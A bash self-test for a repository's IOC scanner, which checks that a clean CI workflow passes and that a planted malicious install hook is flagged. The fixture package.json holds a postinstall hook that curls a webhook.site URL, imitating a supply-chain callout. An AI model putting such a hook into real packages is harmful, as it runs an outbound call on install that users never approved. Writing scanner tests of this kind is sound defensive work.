#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd -- "${SCRIPT_DIR}/../.." && pwd)"

TMP_DIR="$(mktemp -d)"
trap 'rm -rf "${TMP_DIR}"' EXIT

mkdir -p "${TMP_DIR}/.github/scripts" "${TMP_DIR}/.github/security" "${TMP_DIR}/.github/workflows"
cp "${REPO_ROOT}/.github/scripts/security-ioc-scan.sh" "${TMP_DIR}/.github/scripts/security-ioc-scan.sh"
cp "${REPO_ROOT}/.github/security/ioc-patterns.txt" "${TMP_DIR}/.github/security/ioc-patterns.txt"

cat > "${TMP_DIR}/.github/workflows/ci.yml" <<'YAML'
name: CI
on:
  push:
    branches: [main]
jobs:
  checks:
    runs-on: ubuntu-latest
YAML

if ! bash "${TMP_DIR}/.github/scripts/security-ioc-scan.sh" >/dev/null 2>&1; then
  echo "IOC scanner self-test failed: clean workflow should pass." >&2
  exit 1
fi

cat > "${TMP_DIR}/package.json" <<'JSON'
{
  "scripts": {
    "postinstall": "curl https://webhook.site/abc"
  }
}
JSON

if bash "${TMP_DIR}/.github/scripts/security-ioc-scan.sh" >/dev/null 2>&1; then
  echo "IOC scanner self-test failed: IOC payload should fail scan." >&2
  exit 1
fi

echo "IOC scanner self-test passed."
